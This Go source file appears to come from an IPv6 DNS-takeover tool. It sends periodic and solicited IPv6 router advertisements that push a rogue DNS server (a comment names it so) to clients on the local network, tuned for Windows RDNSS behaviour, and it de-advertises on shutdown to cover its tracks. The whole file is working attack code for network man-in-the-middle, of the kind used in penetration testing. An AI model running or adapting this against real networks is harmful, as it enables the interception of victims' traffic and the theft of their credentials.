package main

import (
	"context"
	"errors"
	"fmt"
	"net"
	"net/netip"
	"time"

	"github.com/mdlayher/ndp"
)

const (
	raHopLimit              = 0
	raDefaultRouterLifetime = 0 * time.Second // we want to advertise a DNS server not a router
	raDelay                 = 500 * time.Millisecond
	raDefaultPeriod         = 3 * time.Minute
)

var (
	ipv6LinkLocalAllRouters = netip.MustParseAddr(net.IPv6linklocalallrouters.String())
	ipv6LinkLocalAllNodes   = netip.MustParseAddr(net.IPv6linklocalallnodes.String())
)

// Material to understand Windows RA behavior:
// * https://insinuator.net/2017/01/ipv6-properties-of-windows-server-2016-windows-10/
// * https://insinuator.net/2017/05/one-step-closer-rdnss-rfc-8106-support-in-windows-10-creators-update/
// * https://ernw.de/download/ERNW_Whitepaper_IPv6_RAs_RDNSS_Conflicting_Parameters_2nd_Iteration_July_2017_v1.1.pdf
// * https://learn.microsoft.com/en-us/answers/questions/884756/after-update-from-windows-10-to-windows-11-ipv6-rf

// SendRouterAdvertisements sends periodic router advertisement messages and
// responds to router solicitation messages.
func SendRouterAdvertisements(ctx context.Context, logger *Logger, config *Config) error {
	iface, err := net.InterfaceByName(config.Interface.Name)
	if err != nil {
		return fmt.Errorf("selecting interface %q: %w", config.Interface.Name, err)
	}

	conn, _, err := ndp.Listen(config.Interface, ndp.LinkLocal)
	if err != nil {
		return fmt.Errorf("dialing (%s): %w", config.Interface.Name, err)
	}

	defer func() { _ = conn.Close() }()

	err = conn.JoinGroup(ipv6LinkLocalAllRouters)
	if err != nil {
		return fmt.Errorf("joining multicast group: %w", err)
	}

	var (
		advertizedDNSServer net.IP
		dnsLifetime         = config.RAPeriod
	)

	if !config.NoRADNS {
		advertizedDNSServer = config.RelayIPv6
	}

	go respondToRouterSolicit(ctx, conn, logger, config.StatelessRA,
		iface.HardwareAddr, config.RouterLifetime, advertizedDNSServer, dnsLifetime)

	sleepCtx(ctx, raDelay) // time for DHCPv6 server to start

	for {
		if ctx.Err() == nil {
			err := sendRouterAdvertisement(conn, ipv6LinkLocalAllNodes, config.StatelessRA, iface.HardwareAddr,
				config.RouterLifetime, advertizedDNSServer, dnsLifetime, logger, false)
			if err != nil {
				return err
			}
		}

		timer := time.NewTimer(config.RAPeriod)

		select {
		case <-ctx.Done():
			if !timer.Stop() {
				<-timer.C
			}

			// de-advertise to remove gateway and DNS server from client configuration
			return sendRouterAdvertisement(conn, ipv6LinkLocalAllNodes, config.StatelessRA,
				iface.HardwareAddr, 0, advertizedDNSServer, 0, logger, true)
		case <-timer.C:
			continue
		}
	}
}

func respondToRouterSolicit(ctx context.Context, c *ndp.Conn, logger *Logger, stateless bool,
	routerMac net.HardwareAddr, routerLifetime time.Duration, dnsAddr net.IP, dnsLifetime time.Duration,
) {
	for ctx.Err() == nil {
		msg, _, addr, err := c.ReadFrom()
		if errors.Is(err, net.ErrClosed) {
			return
		} else if err != nil {
			logger.Debugf("receiving NDP message: %v", err)

			continue
		}

		switch m := msg.(type) {
		case *ndp.RouterSolicitation:
			err = sendRouterAdvertisement(c, addr, stateless, routerMac, routerLifetime,
				dnsAddr, dnsLifetime, logger, false)
			if errors.Is(err, net.ErrClosed) {
				return
			} else if err != nil {
				logger.Errorf("sending solicited router advertisement: %v", err)
			}
		case *ndp.RouterAdvertisement:
			logger.Debugf("received router advertisement from %s (M=%v, O=%v)",
				addr, m.ManagedConfiguration, m.OtherConfiguration)
		default:
		}
	}
}

func sendRouterAdvertisement(c *ndp.Conn, receiver netip.Addr, stateless bool, routerMAC net.HardwareAddr,
	routerLifetime time.Duration, dnsAddr net.IP, dnsLifetime time.Duration, logger *Logger, deadvertisement bool,
) error {
	if receiver.IsUnspecified() {
		receiver = ipv6LinkLocalAllNodes
	}

	raMessage := &ndp.RouterAdvertisement{
		CurrentHopLimit:      raHopLimit,
		ManagedConfiguration: !stateless,
		OtherConfiguration:   !stateless,

		RouterSelectionPreference: ndp.High,
		RouterLifetime:            routerLifetime,
		Options: []ndp.Option{
			&ndp.LinkLayerAddress{
				Direction: ndp.Source,
				Addr:      routerMAC,
			},
		},
	}

	if dnsAddr != nil {
		netipDNSAddr, ok := netip.AddrFromSlice(dnsAddr)
		if !ok {
			return fmt.Errorf("converting DNS address %s failed", dnsAddr)
		}

		// RecursiveDNSServer is supported by Windows 10 since the creators
		// update. Setting this option during advertisement and de-advertisement
		// prevents situations where the gateway is cleared but the rogoue DNS
		// server persists and situations where the gateway is configured but
		// not the rogue DNS server. See line "RA Based DNS Config (RFC 6106)"
		// in `netsh int ipv6 sh int <interface number>`.
		raMessage.Options = append(raMessage.Options, &ndp.RecursiveDNSServer{
			Lifetime: dnsLifetime,
			Servers:  []netip.Addr{netipDNSAddr},
		})
	}

	var r net.IP
	if receiver != ipv6LinkLocalAllNodes {
		r = receiver.AsSlice()
	}

	logger.RA(r, routerLifetime != 0, dnsAddr != nil && dnsLifetime != 0, deadvertisement,
		raMessage.ManagedConfiguration, raMessage.OtherConfiguration)

	err := c.WriteTo(raMessage, nil, receiver)
	if err != nil {
		return fmt.Errorf("sending router advertisement: %w", err)
	}

	return nil
}

func sleepCtx(ctx context.Context, d time.Duration) {
	timer := time.NewTimer(d)

	select {
	case <-ctx.Done():
		if !timer.Stop() {
			<-timer.C
		}
	case <-timer.C:
	}
}
